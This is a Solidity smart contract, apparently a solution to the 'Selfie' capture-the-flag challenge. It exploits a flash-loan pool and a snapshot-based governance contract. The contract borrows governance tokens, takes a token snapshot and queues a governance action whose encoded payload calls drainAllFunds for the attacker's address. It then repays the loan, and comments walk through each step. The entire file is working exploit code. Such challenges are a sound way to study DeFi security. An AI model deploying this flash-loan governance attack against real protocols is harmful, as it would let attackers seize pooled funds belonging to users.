// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface ISelfiePool {
    function flashLoan(uint256 borrowAmount) external;
}

interface ISimpleGovernance {
    function executeAction(uint256 actionId) external payable;

    function queueAction(
        address receiver,
        bytes calldata data,
        uint256 weiAmount
    ) external returns (uint256);
}

interface IERC20 {
    function transfer(address from, uint256 value) external;

    function snapshot() external returns (uint256);
}

contract SelfieDrainFunds {
    using Address for address;

    ISelfiePool public selfiePool;
    ISimpleGovernance public simpleGovernance;

    address public attacker;

    uint256 public constant ATTACK_AMOUNT = 1500000 ether;
    uint256 public actionId;

    // Borrows flashloan from 'SelfiePool'
    function executeFlashloan(
        ISelfiePool _selfiePool,
        ISimpleGovernance _simpleGovernance
    ) external {
        selfiePool = _selfiePool;
        simpleGovernance = _simpleGovernance;
        attacker = msg.sender;
        selfiePool.flashLoan(ATTACK_AMOUNT);
    }

    // Called by 'SelfiePool' after lending tokens
    function receiveTokens(address _token, uint256 _amount) external {
        // Only 'SelfiePool' contract can call this function
        require(msg.sender == address(selfiePool), "Only selfie pool can call");

        // Taking snapshot before calling 'queueAction' function as it makes sure that
        // the sender owns atleast half the supply of 'Governance Token' at last snapshot
        // before storing the action/ proposal in queue.
        IERC20(_token).snapshot();

        // When 'executeAction' function of 'SimpleGovernance' is called, it executes whatever is send
        // as a payload to 'queueAction' function.
        // We are passing 'drainAllFunds' function of 'SelfiePool' contract as a payload
        // with attacker address as a receiver of the funds, because
        // it (executeAction) can only be called by the 'SimpleGovernance' contract.
        // After two days, we can call 'executeAction' function of 'SimpleGovernance' (with our actionId) and it will
        // trigger the 'drainAllFunds' function of 'SelfiePool' contract resulting in transfer of all the funds
        // to the attacker

        // Preparing malicious payload
        bytes memory payload = abi.encodeWithSignature(
            "drainAllFunds(address)",
            attacker
        );

        // So that we can call executeAction function with appropriate actionId
        actionId = simpleGovernance.queueAction(
            address(selfiePool),
            payload,
            0
        );

        // Transferring borrowed tokens back to the lender
        IERC20(_token).transfer(msg.sender, _amount);
    }
}
